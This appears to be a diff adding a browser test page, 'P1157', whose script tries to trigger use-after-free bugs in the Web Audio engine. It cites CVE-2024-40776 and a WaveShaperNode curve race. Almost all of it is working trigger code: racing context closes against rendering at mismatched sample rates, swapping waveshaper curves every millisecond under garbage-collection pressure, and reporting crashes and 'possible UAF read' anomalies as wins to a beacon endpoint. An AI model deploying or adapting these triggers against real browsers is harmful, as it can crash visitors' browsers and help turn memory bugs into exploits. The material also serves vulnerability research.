@@ -1,0 +1,519 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>P1157</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#0a0a0f;color:#c8ffc8;font:11px/1.4 monospace;padding:10px;min-height:100vh}
+#log{white-space:pre-wrap;word-break:break-all}
+.ok{color:#6f6}.fail{color:#f66}.ptr{color:#f6f}.info{color:#6cf}
+.phase{color:#fff;font-size:13px;font-weight:bold;margin:6px 0}
+.win{color:#0f0;font-weight:bold;font-size:14px}
+</style>
+</head><body>
+<div id="log"></div>
+<script>
+var L=document.getElementById('log');
+function log(c,m){var d=document.createElement('div');d.className=c;d.textContent=m;L.appendChild(d);}
+function B(t,d){try{new Image().src='/beacon.php?tag='+encodeURIComponent(t)+'&data='+encodeURIComponent(d||'')+'&_='+Math.random();}catch(e){}}
+
+log('phase','=== P1157: WEB AUDIO UAF DUAL TEST ===');
+log('info','CVE-2024-40776: AudioBus/MultiChannelResampler lifetime');
+log('info','WaveShaperDSPKernel::processCurve() curve replacement race');
+B('P1157-START','t='+Date.now());
+
+var startT=Date.now();
+
+// === FEATURE DETECTION ===
+var hasAC=!!(window.AudioContext||window.webkitAudioContext);
+var ACtor=window.AudioContext||window.webkitAudioContext;
+B('P1157-FEAT','AudioContext='+hasAC);
+log('info','Web Audio API: '+hasAC);
+
+if(!hasAC){
+  B('P1157-DONE','no WebAudio');
+  log('fail','Web Audio API not available - cannot test');
+}else{
+
+// ============================================================
+// TEST A: CVE-2024-40776 — AudioBus lifetime UAF via resampler
+// When AudioBuffer sampleRate != AudioContext sampleRate,
+// a MultiChannelResampler is used. The source AudioBus holds
+// a raw pointer to the resampler's AudioArray. If the resampler
+// is freed while the AudioBus is still referenced by a render
+// task, we get a UAF.
+// ============================================================
+(function testA(){
+  log('phase','--- A: AudioBus resampler lifetime UAF (CVE-2024-40776) ---');
+  var crashed=false;
+  var iterations=0;
+  var maxIter=20;
+
+  function runOnce(iter){
+    if(iter>=maxIter){
+      B('P1157-A-DONE','iters='+iterations+'|crashed='+crashed);
+      log(crashed?'win':'info','A done: '+iterations+' iters, crashed='+crashed);
+      testA2();
+      return;
+    }
+    iterations=iter+1;
+    try{
+      // Create context at 44100 Hz
+      var ctx=new ACtor({sampleRate:44100});
+
+      // Create AudioBuffer at DIFFERENT sample rate (48000)
+      // This forces MultiChannelResampler when connected
+      var buf=ctx.createBuffer(2, 48000, 48000); // 2ch, 1sec at 48kHz
+      for(var ch=0;ch<2;ch++){
+        var data=buf.getChannelData(ch);
+        for(var i=0;i<data.length;i++){
+          data[i]=Math.sin(2*Math.PI*440*i/48000)*(ch===0?1:-1);
+        }
+      }
+
+      // Create source and connect
+      var src=ctx.createBufferSource();
+      src.buffer=buf;
+      src.loop=true;
+      src.connect(ctx.destination);
+      src.start(0);
+
+      // Let it render a few frames (the resampler is now active)
+      // Then rapidly disconnect and close — the AudioBus may still
+      // reference the resampler's AudioArray
+      setTimeout(function(){
+        try{
+          src.disconnect();
+          src.buffer=null; // drop buffer reference
+          src=null;
+          buf=null;
+
+          // Close context while render thread may still be processing
+          if(ctx.close){
+            ctx.close().then(function(){
+              ctx=null;
+              // GC pressure
+              for(var g=0;g<500;g++){var t=new ArrayBuffer(4096);t=null;}
+              setTimeout(function(){runOnce(iter+1);},50);
+            }).catch(function(){
+              ctx=null;
+              setTimeout(function(){runOnce(iter+1);},50);
+            });
+          }else{
+            ctx=null;
+            setTimeout(function(){runOnce(iter+1);},50);
+          }
+        }catch(e){
+          B('P1157-A-ERR','iter='+iter+'|msg='+e.message.substring(0,50));
+          setTimeout(function(){runOnce(iter+1);},50);
+        }
+      }, 5+Math.floor(Math.random()*15)); // Random timing 5-20ms
+    }catch(e){
+      B('P1157-A-ERR','iter='+iter+'|msg='+e.message.substring(0,50));
+      setTimeout(function(){runOnce(iter+1);},50);
+    }
+  }
+  runOnce(0);
+})();
+
+// === A2: Aggressive variant — rapid create/destroy with mismatched rates ===
+function testA2(){
+  log('phase','--- A2: Rapid create/destroy resampler stress ---');
+  var count=0;
+  var errCount=0;
+
+  function burst(){
+    try{
+      // Create 5 contexts simultaneously with different sample rates
+      var ctxArr=[];
+      var rates=[22050,44100,48000,96000,8000];
+      for(var i=0;i<5;i++){
+        try{
+          var c=new ACtor({sampleRate:rates[i]});
+          ctxArr.push(c);
+        }catch(e){ctxArr.push(null);}
+      }
+
+      // Cross-connect: create buffers at rate X, play in context at rate Y
+      for(var i=0;i<ctxArr.length;i++){
+        if(!ctxArr[i])continue;
+        var otherRate=rates[(i+2)%rates.length]; // different rate
+        try{
+          var b=ctxArr[i].createBuffer(1,otherRate,otherRate);
+          var d=b.getChannelData(0);
+          for(var j=0;j<d.length;j++)d[j]=Math.random()*2-1;
+          var s=ctxArr[i].createBufferSource();
+          s.buffer=b;
+          s.connect(ctxArr[i].destination);
+          s.start(0);
+        }catch(e){errCount++;}
+      }
+
+      // Wait tiny bit then close all at once
+      setTimeout(function(){
+        for(var i=0;i<ctxArr.length;i++){
+          try{if(ctxArr[i]&&ctxArr[i].close)ctxArr[i].close();}catch(e){}
+        }
+        ctxArr=null;
+        // GC pressure
+        for(var g=0;g<1000;g++){var t=new ArrayBuffer(2048);t=null;}
+        count++;
+        if(count<10){
+          setTimeout(burst,30);
+        }else{
+          B('P1157-A2-DONE','bursts='+count+'|errs='+errCount);
+          log('info','A2 done: '+count+' bursts, '+errCount+' errors');
+          testB();
+        }
+      },3+Math.floor(Math.random()*10));
+    }catch(e){
+      B('P1157-A2-ERR','msg='+e.message.substring(0,40));
+      count++;
+      if(count<10)setTimeout(burst,30);
+      else{testB();}
+    }
+  }
+  burst();
+}
+
+// ============================================================
+// TEST B: WaveShaperDSPKernel::processCurve() curve race UAF
+// The WaveShaperNode's curve property can be replaced from the
+// main thread while processCurve() reads it on the audio thread.
+// Before the fix, curveForBindings() returned the internal array
+// directly; replacing .curve frees the old array while the audio
+// thread still reads from it.
+// ============================================================
+function testB(){
+  log('phase','--- B: WaveShaperNode curve race UAF ---');
+  var ctx;
+  try{ctx=new ACtor({sampleRate:44100});}
+  catch(e){B('P1157-B-ERR','noCtx|'+e.message.substring(0,30));testC();return;}
+
+  var hasWS=(typeof ctx.createWaveShaper==='function');
+  B('P1157-B-FEAT','WaveShaper='+hasWS);
+  if(!hasWS){
+    B('P1157-B-DONE','no WaveShaper');
+    try{ctx.close();}catch(e){}
+    testC();
+    return;
+  }
+
+  try{
+    var osc=ctx.createOscillator();
+    osc.frequency.value=440;
+    var ws=ctx.createWaveShaper();
+    ws.oversample='4x'; // forces more processing in processCurve
+    var gain=ctx.createGain();
+    gain.gain.value=0.01; // quiet
+
+    osc.connect(ws);
+    ws.connect(gain);
+    gain.connect(ctx.destination);
+    osc.start(0);
+
+    // Set initial large curve
+    var curveSize=65536;
+    var curve=new Float32Array(curveSize);
+    for(var i=0;i<curveSize;i++){
+      curve[i]=(i/curveSize)*2-1;
+    }
+    ws.curve=curve;
+    B('P1157-B-SETUP','osc+ws+gain connected, curve set');
+
+    // Now rapidly replace the curve while audio thread reads it
+    var replaceCount=0;
+    var interval=setInterval(function(){
+      try{
+        // Create new curve (old one should be freed)
+        var newCurve=new Float32Array(curveSize);
+        for(var i=0;i<curveSize;i++){
+          newCurve[i]=Math.sin(i*0.001)*(replaceCount%2===0?1:-1);
+        }
+        ws.curve=newCurve;
+        // Also try setting to null then back
+        if(replaceCount%5===0){
+          ws.curve=null;
+          var c2=new Float32Array(curveSize);
+          for(var i=0;i<curveSize;i++)c2[i]=i/curveSize;
+          ws.curve=c2;
+        }
+        replaceCount++;
+
+        // GC pressure to free old curves faster
+        for(var g=0;g<200;g++){var t=new Float32Array(1024);t=null;}
+      }catch(e){
+        B('P1157-B-RACE-ERR','iter='+replaceCount+'|msg='+e.message.substring(0,40));
+      }
+    },1); // Every 1ms — as fast as possible
+
+    // Run for 3 seconds
+    setTimeout(function(){
+      clearInterval(interval);
+      B('P1157-B-DONE','replaces='+replaceCount);
+      log('info','B done: '+replaceCount+' curve replacements');
+      osc.stop();
+      try{ctx.close();}catch(e){}
+      testB2();
+    },3000);
+  }catch(e){
+    B('P1157-B-ERR','setup|'+e.message.substring(0,40));
+    try{ctx.close();}catch(e2){}
+    testB2();
+  }
+}
+
+// === B2: WaveShaper with disconnect during processing ===
+function testB2(){
+  log('phase','--- B2: WaveShaper disconnect during processing ---');
+  var doneCount=0;
+  var maxRuns=15;
+
+  function run(n){
+    if(n>=maxRuns){
+      B('P1157-B2-DONE','runs='+doneCount);
+      testC();
+      return;
+    }
+    doneCount=n+1;
+    try{
+      var ctx=new ACtor({sampleRate:44100});
+      var osc=ctx.createOscillator();
+      osc.frequency.value=220+n*50;
+      var ws=ctx.createWaveShaper();
+      ws.oversample=(n%2===0)?'4x':'2x';
+      var curve=new Float32Array(8192);
+      for(var i=0;i<8192;i++)curve[i]=Math.tanh((i/4096-1)*3);
+      ws.curve=curve;
+      osc.connect(ws);
+      ws.connect(ctx.destination);
+      osc.start(0);
+
+      // Random tiny delay then disconnect + close simultaneously
+      setTimeout(function(){
+        try{
+          osc.disconnect();
+          ws.disconnect();
+          ws.curve=null;
+          osc.stop();
+        }catch(e){}
+        try{ctx.close();}catch(e){}
+        curve=null;ws=null;osc=null;ctx=null;
+        for(var g=0;g<300;g++){var t=new ArrayBuffer(2048);t=null;}
+        setTimeout(function(){run(n+1);},20);
+      },2+Math.floor(Math.random()*8));
+    }catch(e){
+      B('P1157-B2-ERR','n='+n+'|'+e.message.substring(0,30));
+      setTimeout(function(){run(n+1);},20);
+    }
+  }
+  run(0);
+}
+
+// ============================================================
+// TEST C: OfflineAudioContext resampler UAF
+// OfflineAudioContext renders synchronously — we can trigger
+// the resampler and immediately access the rendered buffer
+// ============================================================
+function testC(){
+  log('phase','--- C: OfflineAudioContext resampler stress ---');
+  var hasOAC=!!(window.OfflineAudioContext||window.webkitOfflineAudioContext);
+  B('P1157-C-FEAT','OfflineAudioContext='+hasOAC);
+  if(!hasOAC){testD();return;}
+
+  var OACtor=window.OfflineAudioContext||window.webkitOfflineAudioContext;
+  var count=0;
+  var maxCount=10;
+
+  function runOffline(n){
+    if(n>=maxCount){
+      B('P1157-C-DONE','runs='+count);
+      testD();
+      return;
+    }
+    count=n+1;
+    try{
+      // Render at 44100 with buffer at 48000 — forces resampler
+      var offline=new OACtor(2, 44100, 44100);
+      var buf=offline.createBuffer(2, 48000, 48000);
+      for(var ch=0;ch<2;ch++){
+        var d=buf.getChannelData(ch);
+        for(var i=0;i<d.length;i++)d[i]=Math.sin(i*0.01)*0.5;
+      }
+      var src=offline.createBufferSource();
+      src.buffer=buf;
+      src.connect(offline.destination);
+      src.start(0);
+
+      // Start rendering, then immediately null out references
+      offline.startRendering().then(function(rendered){
+        // Check rendered buffer for anomalies
+        var ch0=rendered.getChannelData(0);
+        var hasNaN=false,hasInf=false,hasHuge=false;
+        for(var i=0;i<Math.min(ch0.length,1000);i++){
+          if(isNaN(ch0[i]))hasNaN=true;
+          if(!isFinite(ch0[i]))hasInf=true;
+          if(Math.abs(ch0[i])>10)hasHuge=true;
+        }
+        B('P1157-C-RENDER','n='+n+'|len='+ch0.length+'|nan='+hasNaN+'|inf='+hasInf+'|huge='+hasHuge);
+        if(hasNaN||hasInf||hasHuge){
+          log('win','!!! ANOMALOUS AUDIO DATA — possible UAF read !!!');
+          B('P1157-C-ANOMALY','n='+n+'|sample0='+ch0[0]+'|sample1='+ch0[1]);
+        }
+        // Null everything, GC
+        src=null;buf=null;offline=null;rendered=null;
+        for(var g=0;g<500;g++){var t=new ArrayBuffer(4096);t=null;}
+        setTimeout(function(){runOffline(n+1);},30);
+      }).catch(function(e){
+        B('P1157-C-ERR','n='+n+'|'+e.message.substring(0,40));
+        setTimeout(function(){runOffline(n+1);},30);
+      });
+
+      // Immediately null source references to race with render
+      src=null;
+      buf=null;
+    }catch(e){
+      B('P1157-C-ERR','n='+n+'|'+e.message.substring(0,40));
+      setTimeout(function(){runOffline(n+1);},30);
+    }
+  }
+  runOffline(0);
+}
+
+// ============================================================
+// TEST D: ScriptProcessorNode (deprecated but often present)
+// Rapid buffer access during processing
+// ============================================================
+function testD(){
+  log('phase','--- D: ScriptProcessorNode buffer race ---');
+  try{
+    var ctx=new ACtor({sampleRate:44100});
+    var hasSPN=(typeof ctx.createScriptProcessor==='function');
+    B('P1157-D-FEAT','ScriptProcessor='+hasSPN);
+    if(!hasSPN){
+      try{ctx.close();}catch(e){}
+      testE();
+      return;
+    }
+
+    var osc=ctx.createOscillator();
+    osc.frequency.value=440;
+    var sp=ctx.createScriptProcessor(4096,1,1);
+    var processCount=0;
+    var anomalies=0;
+
+    sp.onaudioprocess=function(e){
+      processCount++;
+      var inp=e.inputBuffer.getChannelData(0);
+      var out=e.outputBuffer.getChannelData(0);
+      // Check for anomalous values in input
+      for(var i=0;i<inp.length;i++){
+        if(isNaN(inp[i])||!isFinite(inp[i])||Math.abs(inp[i])>2){
+          anomalies++;
+          break;
+        }
+        out[i]=inp[i]*0.5;
+      }
+    };
+
+    osc.connect(sp);
+    sp.connect(ctx.destination);
+    osc.start(0);
+
+    // While processing, disconnect and reconnect rapidly
+    var flipCount=0;
+    var flipInterval=setInterval(function(){
+      try{
+        osc.disconnect();
+        osc.connect(sp);
+        flipCount++;
+      }catch(e){}
+    },5);
+
+    setTimeout(function(){
+      clearInterval(flipInterval);
+      B('P1157-D-DONE','process='+processCount+'|anomalies='+anomalies+'|flips='+flipCount);
+      log('info','D done: '+processCount+' process calls, '+anomalies+' anomalies');
+      if(anomalies>0)log('win','!!! ScriptProcessor anomaly detected !!!');
+      osc.stop();
+      sp.disconnect();
+      try{ctx.close();}catch(e){}
+      testE();
+    },2000);
+  }catch(e){
+    B('P1157-D-ERR',e.message.substring(0,40));
+    testE();
+  }
+}
+
+// ============================================================
+// TEST E: AnalyserNode getFloatFrequencyData during disconnect
+// ============================================================
+function testE(){
+  log('phase','--- E: AnalyserNode race during disconnect ---');
+  try{
+    var ctx=new ACtor({sampleRate:44100});
+    var hasAN=(typeof ctx.createAnalyser==='function');
+    B('P1157-E-FEAT','Analyser='+hasAN);
+    if(!hasAN){try{ctx.close();}catch(e){}finish();return;}
+
+    var osc=ctx.createOscillator();
+    osc.frequency.value=1000;
+    var an=ctx.createAnalyser();
+    an.fftSize=2048;
+    osc.connect(an);
+    an.connect(ctx.destination);
+    osc.start(0);
+
+    var readCount=0;
+    var anomalies=0;
+    var freqData=new Float32Array(an.frequencyBinCount);
+    var timeData=new Float32Array(an.fftSize);
+
+    // Rapidly read analyser data while toggling connections
+    var readInterval=setInterval(function(){
+      try{
+        an.getFloatFrequencyData(freqData);
+        an.getFloatTimeDomainData(timeData);
+        readCount++;
+        // Check for anomalous values
+        for(var i=0;i<freqData.length;i++){
+          if(isNaN(freqData[i])||(!isFinite(freqData[i])&&freqData[i]!==-Infinity)){
+            anomalies++;
+            B('P1157-E-ANOMALY','i='+i+'|val='+freqData[i]);
+            break;
+          }
+        }
+        // Toggle connection
+        if(readCount%3===0){
+          osc.disconnect();
+          osc.connect(an);
+        }
+      }catch(e){}
+    },2);
+
+    setTimeout(function(){
+      clearInterval(readInterval);
+      B('P1157-E-DONE','reads='+readCount+'|anomalies='+anomalies);
+      log('info','E done: '+readCount+' reads, '+anomalies+' anomalies');
+      osc.stop();
+      try{ctx.close();}catch(e){}
+      finish();
+    },2000);
+  }catch(e){
+    B('P1157-E-ERR',e.message.substring(0,40));
+    finish();
+  }
+}
+
+function finish(){
+  var dt=Date.now()-startT;
+  B('P1157-SUMMARY','dt='+dt);
+  B('P1157-DONE','complete|dt='+dt);
+  log('phase','=== P1157 COMPLETE ('+dt+'ms) ===');
+}
+
+} // end hasAC check
+
+// Safety timeout
+setTimeout(function(){
+  B('P1157-TIMEOUT','dt='+(Date.now()-startT));
+},30000);
+</script></body></html>
